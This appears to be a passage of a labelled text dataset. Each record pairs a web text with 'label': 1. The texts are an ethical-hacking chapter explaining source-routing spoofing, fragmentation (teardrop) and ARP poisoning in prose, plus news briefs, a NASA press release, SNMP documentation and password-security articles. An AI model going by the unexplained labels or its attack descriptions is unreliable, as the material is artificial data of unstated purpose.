attack can be used if the victimís web server is protected by an access list based on source addresses. If the hacker were to simply spoof one of the permitted source addresses, traffic would never be returned to him. By spoofing an address and setting the loose source routing option to force the response to return to the hackerís network, the attack might succeed. The best defense against this type of attack is to block loose source routing and not respond to packets set with this option.\nIf IP must send a datagram larger than allowed by the network access layer that it uses, the datagram must be divided into smaller packets. Not all network topologies can handle the same datagram size; therefore, fragmentation is an important function. As IP packets pass through routers, IP reads the acceptable size for the network access layer. If the existing datagram is too large, IP performs fragmentation and divides the datagram into two or more packets. Each packet is labeled with a length, an offset, and a more bit. The length specifies the total length of the fragment, the offset specifies the distance from the first byte of the original datagram, and the more bit is used to indicate if the fragment has more to follow or if it is the last in the series of fragments. An example is shown in Figure 2.8.\nThe first fragment has an offset of 0 and occupies bytes 0Ė999. The second fragment has an offset of 1,000 and occupies bytes 1,000Ė1,999. The third fragment has an offset of 2,000 and occupies bytes 2,000Ė2,999, and the final fragment has an offset 3,000 and occupies bytes 3,000Ė3,599. Whereas the first three fragments have the more bit set to 1, the final fragment has the more bit set to 0 because no more fragments follow. These concepts are important to understand how various attacks function. If you are not completely comfortable with these concepts, you might want to review a general TCP/IP network book. TCP/IP Illustrated by Richard Stevens is recommended.\nOn modern networks, there should be very little fragmentation. Usually such traffic will indicate malicious activities.\nTo get a better idea of how fragmentation can be exploited by hackers, consider the following: Normally, these fragments follow the logical structured sequence as shown in Figure 2.8. Hackers can manipulate packets to cause them to overlap abnormally, as shown in Figure 2.9.\nHackers can also craft packets so that instead of overlapping, there will be gaps between various packets. These nonadjacent fragmented packets are similar to overlapping packets because they can crash or hang older operating systems that have not been patched.\nA good example of the overlapping fragmentation attack is the teardrop attack. The teardrop attack exploits overlapping IP fragment and can crash Windows 95, Windows NT, and Windows 3.1 machines.\nOne of the other protocols residing at the Internet layer is ICMP. Its purpose is to provide feedback used for diagnostics or to report logical errors. ICMP messages follow a basic format. The first byte of an ICMP header indicates the type of ICMP message. The following byte contains the code for each particular type of ICMP. The ICMP type generally defines the problem, whereas the code is provided to allow a specific reason of what the problem is. As an example, a Type 3, Code 3 ICMP means that there was a destination error and that the specific destination error is that the targeted port is unreachable. Eight of the most common ICMP types are shown in Table 2.4.\nTABLE 2.4 ICMP Types and Codes\nType Code Function 0/8 0 Echo Response/Request (Ping) 3 0-15 Destination Unreachable 4 0 Source Quench 5 0-3 Redirect 11 0-1 Time Exceeded 12 0 Parameter Fault 13/14 0 Time Stamp Request/Response 17/18 0 Subnet Mask Request/Response\nTABLE 2.5 Type 3 Codes\nCode Function 0 Net Unreachable 1 Host Unreachable 2 Protocol Unreachable 3 Port Unreachable 4 Fragmentation Needed and Don't Fragment was Set 5 Source Route Failed 6 Destination Network Unknown 7 Destination Host Unknown 8 Source Host Isolated 9 Communication with Destination Network is Administratively Prohibited 10 Communication with Destination Host is Administratively Prohibited 11 Destination Network Unreachable for Type of Service 12 Destination Host Unreachable for Type of Service 13 Communication Administratively Prohibited\nType 11 ICMP time exceeded messages are used by most traceroute programs to determine the IP addresses of intermediate routers.\nAddress Resolution Protocol (ARP) is the final protocol reviewed at the IP layer. ARPís role in the world of networking is to resolve known IP addresses to unknown MAC addresses. ARPís two-step resolution process is performed by first sending a broadcast message requesting the targetís physical address. If a device recognizes the address as its own, it issues an ARP reply containing its MAC address to the original sender. The MAC address is then placed in the ARP cache and used to address subsequent frames. You discover that hackers are interested in the ARP process as it can be manipulated to bypass the functionality of a switch. Because ARP was developed in a trusting world, bogus ARP responses are accepted as valid, which can allow attackers to redirect traffic on a switched network. Proxy ARPs can be used to extend a network and enable one device to communicate with a device on an adjunct node. ARP attacks play a role in a variety of man-in-the middle attacks, spoofing, and in-session hijack attacks.\nARP is unauthenticated and, as such, can be used for unsolicited ARP replies, for poisoning the ARP table, and for spoofing another host.\nThe network access layer is the bottom of the stack. This portion of the TCP/IP network model is responsible for the physical delivery of IP packets via frames. Ethernet is the most commonly used LAN frame type. Ethernet frames are addressed with MAC addresses that identify the source and destination device. MAC addresses are 6 bytes long and are unique to the Network Interface card (NIC) card in which they are burned. To get a better idea of what MAC addresses look like, review Figure 2.10, as it shows a packet with both the destination and source MAC addresses. Hackers can use a variety of programs to spoof MAC addresses. Spoofing MAC addresses can be a potential target to attackers attempting to bypass 802.11 wireless controls or when switches are used to control traffic by locking ports to specific MAC addresses.\nMAC addresses can be either unicast, multicast, or broadcast. Although a destination MAC address can be any one of these three types, a frame will always originate from a unicast MAC address.\nThe three types of MAC addresses can be easily identified, as follows:\nType Identified by Unicast The first byte is always an even value. Multicast The low order bit in the first byte is always on, and a multicast MAC addresses is an odd value. As an example, notice the first byte (01) of the following MAC address, 0x-01-00-0C-CC-CC-CC. Broadcast They are all binary 1s or will appear in hex as FF FF FF FF FF FF.\nThis lesson discusses the attackerís methodology, as well as some of the methodologies used by ethical hackers. Ethical hackers differ from malicious hackers in that ethical hackers seek to do no harm and work to improve an organizationís security by thinking like a hacker. This lesson also discusses the OSI model and the TCP/IP protocol suite. It looks at some of the most commonly used protocols in the suite and examines how they are used and misused by hackers. Common ports are discussed; as is the principle of deny all. Starting with all ports and protocols blocked leaves the organization in much more of a secure stance than simply blocking ports that are deemed dangerous or unneeded.\nExcercise_2.doc attached for a normal exercise\nwondex like this", "label": 1}
{"text": "November 7, 2007 By Karen Stewartson\nTraffic signals may soon be smart enough to prevent car crashes. A team of scientists at Technion-Israel Institute of Technology in Haifa, Israel, is creating such signals by connecting computers and cameras to \"stop\" and \"yield\" signs.\nWhen the cameras spot two cars approaching an intersection, the computer calculates the collision risk, then flashes warning lights on the sign to alert drivers to slow down or stop. The team's next goal is to invent a smart traffic light, which would delay a green light so an offending driver can clear an intersection without causing a crash. - Businessweek.com\nLondon is equipped with 10,000 crime-fighting closed-circuit TV cameras - which cost approximately $400 million - but doubt has been cast on their ability to help solve crime, thanks to an analysis of the publicly funded camera network.\nBy comparing the number of cameras in each London borough with the proportion of crimes solved there, researchers found that police are no more likely to catch offenders in areas with hundreds of cameras than in those with hardly any. Four out of five of the boroughs with the most cameras have a below-average record of solving crime. - Thisislondon\nCarnegie Mellon University professor Scott E. Fahlman said he was the first to use three keystrokes - a colon followed by a hyphen and a parenthesis - as a horizontal \"smiley face\" in a computer message 25 years ago.\nLanguage experts say the smiley face and other emotional icons or emoticons, have given people a concise way in e-mail and other electronic messages of expressing sentiments that otherwise would be difficult to detect.\nFahlman posted the emoticon in a message to an online bulletin board at 11:44 a.m. on Sept. 19, 1982, during a discussion about the limits of online humor and how to denote light-hearted comments. - Yahoo.com\nMobility on the Move\nAs notebooks become mainstream PC platforms throughout federal agencies, questions abound about the implications for data security. A study by the Telework Exchange, which interviewed 35 federal chief information security officers (CISOs), revealed that federal CISOs do support telework and mobility.\nCISOs were asked if laptop use has increased.\nNo 17 percent\nYes 83 percent\nCISOs were also asked if they have direct input into their agency's telework infrastructure.\nSignificant input 51 percent\nSome input 37 percent\nNo input 12 percent\nAn estimated 800,000 customer kiosks, excluding ATMs, will be installed in North America by the end of 2007 and will hit 1.2 million by 2009, according to a report by consulting firm Summit Research Associates Inc.\nA 2007 forecast showed that North American consumers would spend more than $525 billion at self-checkout lanes, ticketing kiosks and other self-service machines, including postal kiosks by the of the year. That could reach $1.3 trillion by 2011. - IHL Consulting Group\nSurfing the Net has become an obsession for many Americans. One in three adults give up friends for the Web, according to a survey of 1,011 American adults by advertising agency JWT. Conducted Sept. 7-11, 2007, the survey found that 28 percent of respondents admitted spending less time socializing face-to-face with peers because of the amount of time they spend online.\nYou may use or reference this story with attribution and a link to", "label": 1}
{"text": "Kennedy Space Center, Fla.\nAirspace, Bridges and Waterway Restrictions in Effect for All Space Shuttle Launches\nFor the STS-114 launch of Space Shuttle Discovery, NASA managers urge all aircraft pilots and boaters to comply fully with the airspace, bridges and waterway restrictions imposed around KSC prior to and during Space Shuttle launches and landings.\n\"As always, we are coordinating with officials from the Eastern Range and Federal Aviation Administration (FAA) to help provide a safe launch environment for the Shuttle crew and for interested spectators. Violating these restrictions is not only unsafe for the astronauts and support crews, it's unsafe for the violator,\" said KSC Launch Director Mike Leinbach.\nSpace Shuttle Discovery's first launch opportunity is on July 13 at 3:51 p.m. and the launch window extends for five minutes. At NASA's request, U.S. Air Force and U.S. Coast Guard surveillance aircraft will patrol KSC's airspace boundaries on launch day. Violators will be intercepted by patrol forces, thoroughly investigated and will be subject to FAA enforcement action. A number of restrictions remain in effect around the Kennedy Space Center (KSC) during the hours immediately following the launch of a Space Shuttle.\nListed and described below are restrictions that apply to pilots, motor vehicle operators and boaters utilizing airspace, bridges and waterways that lead to KSC. KSC AREA AVIATION RESTRICTIONS\nFor the launch of Space Shuttle Discovery on mission STS-114, all restricted areas surrounding the Kennedy Space Center will be active and the area covered by flight restrictions has once again been expanded for this launch. The length of time the restrictions will be in effect prior to launch has also been extended.\nDue to international terrorist activities, heightened security is essential to protect the Space Shuttle as a national asset. An inadvertent unauthorized incursion into the area of the Cape Canaveral Temporary Flight Restriction (TFR) could cause a scrub in the launch of Discovery, the activation of airspace defenses and an FAA enforcement action. Local pilots are asked to help NASA by respecting these temporary but necessary restrictions so that the launch can occur on time and without incident.\nThe restricted areas for the Kennedy Space Center and Cape Canaveral Air Force Station are in effect on a continuous basis and are limited to official aircraft only, off-limits to general aviation pilots. The restricted air space extends from the surface to but not including 14,000 feet and covers the area bounded by the Indian River to the west, Port Canaveral to the south, the city of Oak Hill to the north, and three miles over the Atlantic Ocean to the east.\nOn launch day these restricted areas will be expanded and will be activated beginning at launch minus 9 hours. On Wednesday, July 13 this occurs at 6:35 a.m. EDT and remains in effect until 6:59 p.m. EDT. Should the launch be scrubbed after the astronauts have boarded Space Shuttle Discovery, the restrictions will remain in effect for three hours after the postponement has been announced.\nFAA Part 91, Part 125, general aviation and VFR operations are prohibited within a 30 nautical mile radius of Launch Pad 39-B from the surface to but not including 18,000 feet (located on the Melbourne VOR/DME 004-degree radial at 30 nautical miles). Among the general aviation airports affected within this area are Space Coast Regional Airport in Titusville, Arthur Dunn Airpark in Titusville, Merritt Island Airport in Merritt Island, Rockledge Airpark in Rockledge and Massey Ranch in Edgewater.\nWithin an airspace radius between 30 and 40 nautical miles of Pad 39-B, a discrete transponder code must be obtained and clearance granted from air traffic control before entering this airspace. Continuous radio communications must be maintained.\nBefore flight, pilots should contact the FAA Flight Service Station at 1-800/WxBrief (1-800/992-7433) for details of the restrictions contained in the NOTAMS. In flight, outside Orlando Class B airspace, pilots should contact Daytona Beach Approach control on 134.95. In the Melbourne area contact Daytona Approach on 132.65, or in the New Smyrna Beach area on 125.35. Flight Service can also be reached locally by radio on the Titusville RCO at 123.6 or the Melbourne RCO on 122.6. Advisories will also be available from the control tower at Space Coast Regional Airport in Titusville at 118.9 megahertz.\nAmong the airports affected within the 30-40 nautical mile radius in which flight is permitted but under positive air traffic control are Orlando International Airport, Orlando Executive Airport, Orlando-Sanford International Airport, the New Smyrna Beach and Spruce Creek airports, Melbourne International Airport and Valkaria. Pilots are encouraged to consult the most recent FAA aeronautical chart for Orlando Class B air space. BRIDGES CONTROLLED FOR LAUNCH\nThe opening and closing of bridges over waterways surrounding KSC will be strictly controlled during the hours immediately before and after the launch period for each Space Shuttle mission.\nBridges affected by the launch include:\n* Canaveral Harbor Barge Canal\n(SR 401, south of Cape Canaveral Air Force Station's Gate 1);\n* Indian River Causeway West or NASA Causeway\n(Intracoastal Waterway at Addison Point);\n* Merritt Island Barge Canal\n(Merritt Island State Road 3);\n* Haulover Canal Bridge\n(State Road 3, north of KSC).\nRestraints on bridge openings for boat traffic begin three hours before launch. The bridges may be opened for five minutes at the following points in the launch countdown: T-180 minutes, T-150 minutes, T-120 minutes, T-90 minutes, and T-65 minutes. Adding 20 minutes to these times and subtracting that amount from the launch time will result in an approximate time of openings.\nBridges will remain closed to boat traffic until 90 minutes after lift-off (T+90). They may then open for five minutes at T+90, T+120 minutes and T+150 minutes. Bridge operations will return to normal three hours (T+180 minutes) after launch.\nShould the Shuttle be required to perform a Return-to-Launch-Site (RTLS) landing at KSC, all bridges would remain closed to boat traffic from 45 minutes before landing until at least one hour after landing. KSC AREA BOATING RESTRICTIONS\nWaterways and boating activities near the Kennedy Space Center will be strictly controlled prior to and during the launch of the Space Shuttle.\nSafety and security requirements, including U.S. Air Force range safety impact limit lines, will go into effect as early as three days before launch. Other requirements will be phased into effect through sunset the night before launch. A general description of the area follows: ATLANTIC OCEAN:\nBeginning noon on Sunday, July 10 through the launch, a general exclusion zone will be in effect three miles offshore from the Haulover Canal, near the north end of KSC, and southward to Port Canaveral. Four hours prior to launch, all ocean-going traffic will be restricted from entering an area measured from nine miles north and south of the launch pad and extending 64 miles east into the ocean. An additional three-mile-wide exclusion zone will be extended eastward along the flight path of the Space Shuttle. MOSQUITO LAGOON:\nThis area south of the Haulover Canal in the Mosquito Lagoon is off limits to all boats beginning the day before launch. INDIAN RIVER:\nRestrictions apply from the NASA Causeway north to the Haulover Canal and east of the Indian River's main channel. Restrictions begin at noon on Sunday, July 10. BANANA RIVER:\nSecurity limits begin at the Banana River Barge Canal south of KSC at the State Road 528 crossing and extend north. This restriction is effective roughly 16 hours prior to launch.\nAll boating restrictions will be lifted approximately one hour after launch.\nBoating interests should monitor U.S. Coast Guard Channel 16 broadcasting from Port Canaveral. The U.S. Coast Guard, the U.S. Fish and Wildlife Service, and KSC security forces share responsibility for enforcing the boating guidelines. ROAD CLOSURES:\nSpace Commerce Way which connects State Road 3 with State Road 405 (NASA Causeway) will be closed on launch day, July 13 beginning at 8 a.m. It will reopen after launch at 6 p.m. The closure is necessary due to the expected high volume of traffic on these highways.\n- end -\ntext-only version of this release\nTo receive status reports and news releases issued from the Kennedy Space Center Newsroom electronically, send a blank e-mail\nmessage to email@example.com. To unsubscribe, send\na blank e-mail message to firstname.lastname@example.org.\nThe system will confirm your request via e-mail.", "label": 1}
{"text": "domain name dispute\nA domain name dispute is a conflict that arises when more than one individual or group believes it has the right to register a specific domain name. Most commonly a domain name dispute would occur when a domain name similar to a registered trademark is registered by an individual or organization who is not the trademark owner. All domain name registrars must follow the ICANN's Uniform Domain-Name Dispute-Resolution Policy (UDRP).\nSee \"Registering a Domain Name\" and \"Understanding Internet Governance\" in the Did You Know...? section of Webopedia.\nSee also \"Countries and Their Domain Extensions\" in Webopedia's Quick Reference Section.\nFeatured Partners Sponsored\n- Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.»\n- Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. »\n- Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.»\n- Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »", "label": 1}
{"text": "The Simple Network Management Protocol (SNMP) has been widely used in enterprise networks to effectively manage systems, network devices, and networks. The widespread use of SNMP has raised many issues relating to managing systems and networks. One of the benefits of SNMP is how quickly solutions may be created to support the increasing numbers of networking components and applications.\nWithin SNMP networks, the number of entities (systems, components, and applications) that need to be managed is growing rapidly. There is a need to respond to the industry's demand for more flexible and dynamic management of multiple devices.\nThe initial network management solution, that is based on SNMP, allowed developers to create one monolithic agent per system/device listening on a single port (port 161). It was soon discovered that this SNMP solution had many constraints and was not flexible enough to effectively manage all the devices necessary.\nNew technology was needed to produce multiple agents by different people, that could manage different components and applications separately within a device. This resulted in the new extensible agent technology or Master/subagent technology. Based on this technology, Sun provides a solution named Solstice Enterprise Agent (SEA).\nThe agents consist of Master Agent and subagents. The Master Agent receives the SNMP-based management requests from the managers and sends responses to these management requests. The responses are sent after retrieving the appropriate values from the respective subagents. The subagents provide management of different components based on Management Information Based (MIBs or MIFs) specifically designed for components/applications.\nThe Enterprise Agent also allows you to integrate and use SNMP-based legacy agents.\nIn subsequent chapters, the roles of the Master Agent and subagents are discussed in detail.\nThe SNMP based component of the SEA product consists of various components.\nFigure 1-1 illustrates the architecture of the SEA.\nThe following is a description of each of the components associated with the SEA product.\nThe Master Agent listens on port 161.\nSubagents are zero or more processes that have access to the management information and provide manageability to various applications/components within a system. These subagents interact with the Master Agent using SNMP. These subagents do not interact with the managers directly.\nThe Software Development Toolkit has multiple components. It includes agent/subagent libraries, a MIB compiler, and example subagents. The MIB compiler parses a MIB and creates stub files. The stub files consist of functions that you modify and enhance appropriately to provide manageability of the respective component or application.\nLegacy SNMP Agents are SNMP-based and work as monolithic entities in a system. The Enterprise Agent allows the integration of legacy SNMP agents. The legacy agents are those agents already in released products from Sun or other companies.\nThe Enterprise Agent technology also allows you to integrate DMI 2.0 functionality. This is accomplished through the mapper, that acts as a subagent. The mapper receives requests from the Master Agent and converts them into appropriate DMI requests, that are then sent to the DMI Service Provider. When the mapper receives the response back from the DMI Service Provider, it converts this response into the SNMP response and forwards it to the Manager through the Master Agent.\nA subtree is indicated by a single oid. The Master Agent has no understanding of what this subtree is without any MIB specification. The subtree may actually be an entire MIB (e.g., 'host'), a full instance (e.g., hrDeviceDescr.42), or may not even be a subtree named in any MIB specification.\nDispatching is the communication of a management request from the Master Agent to one or more subagents. Dispatching is performed according to the Master Agent's current view of registered subtrees, and an explicitly stated algorithm.\nAdditional terms are described in this guide's glossary.\nThe Master Agent receives SNMP requests from the system managers and sends responses to these requests, after determining appropriate values from the subagents. The subagents provide management of different components based on the Management Information Base (MIB) specifically designed for such components/applications. Each subagent, when invoked dynamically, registers with the Master Agent. During registration, it informs the Master Agent of the MIB subtree it manages. For more information, refer to Chapter 3, SNMP-Based Master/Subagenton page 3-1.\nThe SEA technology provides a software development kit that allows you to create, release, and install subagents. Additionally, the SEA allows you to integrate and use SNMP-based legacy agents.\nThe Desktop Management Interface (DMI) is a set of interfaces and a service provider that mediate between management applications and components residing in a system.The DMI is a free-standing interface that is not tied to any particular operating system or management process.\nSun provides DMI based functionality for management of the Sun platforms (hardware and software) and software applications running on these platforms. The DMI subagent is one type of subagent included in the SEA product. By using DMI, you may manage various elements within most systems (for example, PCs, workstations, routers, hubs, and other network objects).\nA format for describing management information (MIF)\nA Service Provider entity\nTwo sets of APIs\nAn interface between management applications and the Service Provider\nAn interface between the Service Provider and component instrumentation\nA set of services (using ONC/RPC) for facilitating remote communication\nFor more information, refer to Chapter 5, Using DMI.\nThe Master Agent acts as the primary interface between the network manager and the subagents. The requests received from the manager are parsed by the Master Agent. If necessary, the original requests are broken into multiple requests. The original request is distributed by the Master Agent based on the manageability provided by each subagent. The request is then forwarded to the appropriate subagents, which provide a response to each request. After collecting all the responses from each subagent, the final response is sent to the network manager.\nOnly one Master Agent presides over the Master/subagent model. The Master Agent acts as a request scheduler and dispatcher for all subscribed subagents. In addition, the subagents send traps to the Master Agent, that are then forwarded to the manager.\nFigure 1-2 illustrates the Master Agent as it relates to the architecture of SEA.", "label": 1}
{"text": "A USB key, also known as a thumb drive or USB drive, is a kind of digital briefcase—a place to store files while you move them from one computer to another. If you’re carrying around confidential business or personal information and want to keep it safe, look for a USB key that features encryption, or scrambling, of your data and requires your PIN or password to access it.\nGovernment or business users who want to make sure an encrypted USB key is secure, however, must look carefully at how these security features work. To achieve the highest level of security, a USB key must include a dedicated security computer chip, for example a smart card chip. This tamperproof container securely stores the data encryption key and verifies your PIN/password to access the data, so it is not vulnerable to attacks on the USB key software. In addition, the key should comply with strong, military-grade encryption standards, such as the U.S. government’s Advanced Encryption Standard 256 (AES-256).\nFor example, researchers recently hacked into popular USB keys claiming to be secure. Using a flaw in the USB key software that checks your password, the researchers were able to read the data on these “secure” devices without knowing the password. More information about high security USB keys is available online.", "label": 1}
{"text": "Lessons in cyber security will now be stepped up in schools in the hope of creating a new generation of IT specialists who can counter hackers, state sponsored attacks and online criminals.\nThe country’s critical infrastructure, such as emergency services, communications, transport and utilities are also under threat because companies are not taking cyber security seriously enough, the National Audit Office report said.\nThe UK suffered 44 million cyber attacks in 2011 – the equivalent of 120,000 a day – and it is estimated to cost the country up to £27 billion a year.\nBut there is a lack of skilled people available to properly protect against such incidents, the report said.\nIt said the number of specialists in the UK has not increased in line with the growth of the internet.\nIt said the shortage of skills “hampers the UK’s ability to protect itself in cyberspace” and that the current pipeline of available talent would not meet demand.\n“Those we interviewed from academia considered that it would take up to 20 years to address the skills gap at all levels of education.”\nThe report blamed a lack of promotion of science and technology subjects at school.\nIt said the Government now “expects cyber security to be a strong strand of the future GCSE computer science syllabus”.\nThere have been concerns that the intelligence and security agencies, especially GCHQ, have struggled to attract and retain the most skilled computer specialists because they can earn far more in the private sector.\nLast year, Jonathan Evans, the director general of MI5, said the \"astonishing\" level of cyber attacks from enemy states and criminals was threatening government secrets and businesses.\nThe NAO report today warned the national infrastructure, which also includes food, health and financial services, were essential to daily life but at risk of attack.\nIt said the majority of services are privately owned and the Government has recognised that it needs to work with industry.\n“It considers, for example, that cyber security is not well understood at board level and executives have difficulty assessing the impact of cyber security risks,” it said.\nAmyas Morse, head of the NAO, said: \"The threat to cyber security is persistent and continually evolving.\n\"Business, government and the public must constantly be alert to the level of risk if they are to succeed in detecting and resisting the threat of cyber attack.\"\nThe Government's cyber strategy has already started to deliver benefits, the NAO said, with the Serious Organised Crime Agency catching more than 2.3 million compromised debit or credit cards since 2011, preventing a potential loss of more than £500 million.\nMP Margaret Hodge, chairwoman of the Public Accounts committee, said: \"The use of the internet for commerce and communication is a force for good, but it also poses new and growing threats that government, businesses and individuals cannot ignore.\n\"With around 80 per cent of the internet in private hands, crossing international boundaries and spanning different jurisdictions, the Government cannot approach internet security in isolation.\n\"Having a robust and well thought-through strategy is crucial if the Government is to respond effectively to cyber threats.\"", "label": 1}
{"text": "Everyone and their mother has a password security strategy, some better than others. Choosing the right one means weighing security against convenience so you can stay safe without losing your mind. But what's the best balance? Is it the same for everyone? With the help of a security expert, I decided to find out.\nOver the years, we've posted several password security tips, tricks and techniques ranging from the simply memorable to the perfectly paranoid. Although I've always used strong passwords, many of my coworkers went through great lengths to heighten their security far beyond mine. I knew my passwords needed an audit, but the security measures put forth by my colleagues seemed so frustrating and inconvenient. I wanted safety but without all the hassle. To find out the best combination of security and convenience, I decided to audit all the methods we recommend with the help of security and investigations expert Brandon Gregg. Before we can get started, however, we need to know what makes our passwords vulnerable.\nThe Three Variables That Contribute to Weak Passwords\nBrandon explained that weak passwords have three variables, and each makes them more vulnerable:\n- An easily guessed/cracked password: Brandon says, \"With Amazon EC2, GPUs*, and software like Accessdata's Distributed Network Attack (DNA), guessing half a billion passwords per second is easy. My personal record is 370 million guesses per second—not crazy, but better than most Law enforcement agencies. It also appears that some sites, such as Twitter, allows these kinds of brute force attacks against user accounts as long as the ‘password guess' is from randomized IP address each attempt.\" With so many guesses possible per second, you don't want an easily crackable password. Later in the post, we'll discuss which methods produce the most secure and reliable passwords.\n- An easily forgotten password: Your passwords don't help you if you can't remember them. Brandon says, \"Always resetting your hard-to-remember password just leads to more mistakes and exposures in the future.\"\n- One password provides access to many sites: Using the same password for everything means that if a hacker cracks one of your accounts, they've cracked them all.\n*GPUs or graphics cards are used to brute force passwords due to how they tackle parallel calculations. One GPU or clusters of GPUs can be made fairly cheaply and are multiple times faster at guessing passwords than their CPU brothers.\nEliminating one or two of the three variables doesn't require much effort, but removing all three causes the higher level of inconvenience I, and many people, hope to avoid. While no security strategy lacks vulnerabilities, in this post we'll audit several types of passwords, from weak and strong and methods of managing them to find out what's the best for convenience and what's the best for security.\nThe Four Levels of Password Security\nLeast Secure: Simple Alphanumeric Passwords\nThe weakest type of password involves combinations of numbers and letters, or just one of each. It may be easy to remember a word, your phone number, or both, but these passwords are easy to crack. Existing software has no trouble guessing dictionary words, phone numbers, or even combinations of both—especially when the password is under eight characters.\nThat said, you won't forget a simple password. If you use it for every account you own, you won't have to remember much at all. Of course, this is extremely insecure. If using a simple and short password, especially across many accounts, you're not far off from using no password at all. For more on why weak passwords are easy to crack, read this.\nExamples: charlie, hotstuff, 8675309, mary212\nSomewhat Secure: Complex 8+ Character Passwords\nComplex passwords require more effort to type, but they also require far more effort to hack. A complex password consists of at least eight characters. You should include capital and lowercase letters, at least one number, and at least one symbol (e.g. !, ?, @, etc.). You should also avoid a single dictionary word (e.g. pantomime → p@nt0m!me). Using a phrase as a starting point is better, but again, not perfect (e.g. \"I love goats → iLuVg0@ts).\nThis method fails when you use a unique password for every site because you have to remember many, many complex strings of letters, numbers, and symbols.\nExamples: t@lk4Ev3r!, iLuVg0@ts, b3stFr13ndS4eVer?!\nVery Secure: A Common Complex Base Password with Unique Identifiers\nYou can't easily remember a lengthy, complex password, so utilizing different ones for every account just doesn't work (unless you're also using a password manager, but we'll get to that later). Remembering just one, however, makes things much easier. It also makes your password less secure unless you add a unique identifier. That unique identifier can relate to the site so you won't forget it. For example, if you used iLuVg0@ts as your common base password and you wanted to create a password for Gmail, you could use iLuVg0@ts-gmail. Brandon prefers this method over others:\nHaving a common base password plus the site name actually removes all three variables. Due to length it won't be cracked by a dictionary or brute force attack. If Linkedin gets compromised your Gmail will remain safe and lastly you aren't going to forget your password. It's the best option available.\nExamples: iLuVg0@ts-gmail, iLuVg0@ts-linkedin, iLuVg0@ts-facebook\nOf course, if a savvy hacker managed to crack one password they might figure out the others. Brandon suggests:\nIn my own passwords I mix up the \"site\" password not with a direct label of GMAIL or LinkedIn, but with email for gmail or resume for linkedin. Something again that is easy to remember, but hard to guess if your account is compromised.\nExamples: iLuVg0@ts-email, iLuVg0@ts-resume, iLuVg0@ts-friends\nWith common basename passwords, you have another secure option: using a three word phrase with spaces (e.g. \"goats love gmail\"). This method may seem less secure because it includes simple dictionary words, but it works because spaces are in play. (You can read more about the three word method here.) Brandon notes that this method sometimes fails because of how sites and applications restrict your password options:\nThe three word method is a good idea, but limited by many of the websites and applications you use. It solves the hard to crack problem and easily compromised issue, but not the easy to remember. Why, you ask? Most sites don't allow spaces as a special character, so you are stuck using \"goats@love@gmail.\" Some sites even prevent the number of special characters you use, so you might have one application that allows password A and another that does not. The next thing you know you have five different password styles and you can't remember which style belongs to which login.\nExamples: goats love gmail, goats@love@facebook, goats!love!pinterist\nAs mentioned, neither solution comes without vulnerabilities. If all your sites allow spaces or don't restrict special characters, the three word method offers greater simplicity. Either way, a common base password and a unique identifier offers both security and convenience.\nExtremely Secure: Two-Factor Authentication and Passwords Even You Don't Know\nNo password is more secure than a lengthy, complex string of characters that nobody knows. The obvious problem? You can't enter a password you don't know. Password managers like LastPass solve this problem by storing all your passwords in a single database, unlocked by one unique password of your choosing. Of course, as Brandon points out, this comes with one major flaw:\nPersonally, I am fearful of any password manager used to centralize my accounts. As someone who \"monitors\" many systems I can personally tell you that if I capture your LastPass master password it's like opening up a nicely wrapped present. I was only going to target your Twitter account, but you just gave me a one stop shop to all your accounts, even the banking accounts I had no idea you had. Thank you LastPass and the lazy user.\nUsing a password manager suffers from a similar vulnerability to using the same password for every site: you crack one, you crack them all. While LastPass, in particular, makes great efforts to keep your passwords safe, you're putting yourself at risk by using one password to rule them all. The solution? Two-factor authentication, something you may have heard about recently. Brandon explains how it works:\nTwo-factor authentication adds a layer of security that is almost impossible to bypass. After using one of the password options above, Google (and other sites) send a text message to your phone. Not only is it hard for hackers to obviously be watching your phone (unless this installed FlexiSPY or other cell monitoring tools) it gives you a heads up to being attacked. If you suddenly get a text message with an authorization code at 2:00 AM, it might be a sign your ex-girlfriend is trying to get into your account.\nWhen using a password manager like LastPass, you should enable two-factor authentication or you are, as Brandon puts it, potentially offering up your passwords as a nicely wrapped present. While we often argue this method secures your accounts better than any method, it also creates the most inconvenience. You'll need to decided whether that inconvenience matters to you or not.\nHow Do I Choose the Best Password Security for Me?\nSecuring your accounts means choosing a balance between convenience and protection. If you're willing to tolerate regular security checks and use randomly-generated passwords you don't know, you can put your paranoia to rest. Most Lifehacker writers and editors use this level of password security because they don't want to assume the risk and find little inconvenience in the extra effort. In fact, many adjusted to the new methods and haven't found two-factor authentication to be inconvenient at all. You may feel the same way.\nPersonally, I find this method excessive and too much of a burden. As a result, I've opted for our third level of security (\"Very Secure\") described above for two reasons. First, using a method that requires a password manager involves trusting someone else with your data. When you give someone else your data you take a risk that they may lose it or share it (whether intentionally or not). If you've ever told a friend a secret, you understand the potential risk. The only well-kept secret is the one you keep yourself. While you can't avoid sharing your information entirely, as that would lead to a horribly insulated life, I believe in keeping how much you share that information to a minimum. Second, I want reasonably easy access to my data and I'm okay with assuming some risk. As someone who's had his fair share of hardships, I don't believe in trying to live life risk-free. Bad things happen. We should take reasonable measures to prevent them, but sometimes they still happen. To me, a tiny bit of added security isn't worth the inconvenience.\nWhat should you choose? Brandon sums up the decision-making process nicely:\nSecurity is not always about who has the best alarms, tallest fences, or latest technology. There are many variables in security that often times people overlook including cost and convenience. We can lock down our computers, phones, and Internet with full encryption, bio-readers, and multi-level authorization, but if you don't assess your own realistic risk you can easily weigh yourself down by high costs and slow access. While two-factor authentication is currently one of the best methods of protecting your data, the added time for the second level of authorization can become a nuisance and maybe overkill. Are you afraid of China snooping in your Gmail? If not, no two-factor authentication is needed. Is there a real concern your savings account can be hacked? Use two-factor authentication on all banking sites that offer it. Better understand your risk to better choose the level of security you need.\nThe level of risk you want to take depends on your personal needs and the level of risk you're willing to take. Just remember—while you can implement extreme security protocols, nothing prevents the possibility of a hack. Everything is vulnerable. Back up your data. Keep a close eye on your accounts. Security involves more than locking everything down with good passwords. You should prepare yourself for the worst. In the meantime, however, lock down your accounts in a way that's secure enough for you and fits well into your life.\nSpecial thanks to Brandon Gregg for his expert advice. Brandon has worked investigations for numerous Fortune 500 companies over the last 12 years investigating theft, fraud, organized crime, corporate espionage, and many high profile cases as well as being an educator, published author, and featured speaker on surveillance, computer forensics, complex investigations, and ethical hacking. You can find out more about him here.", "label": 1}
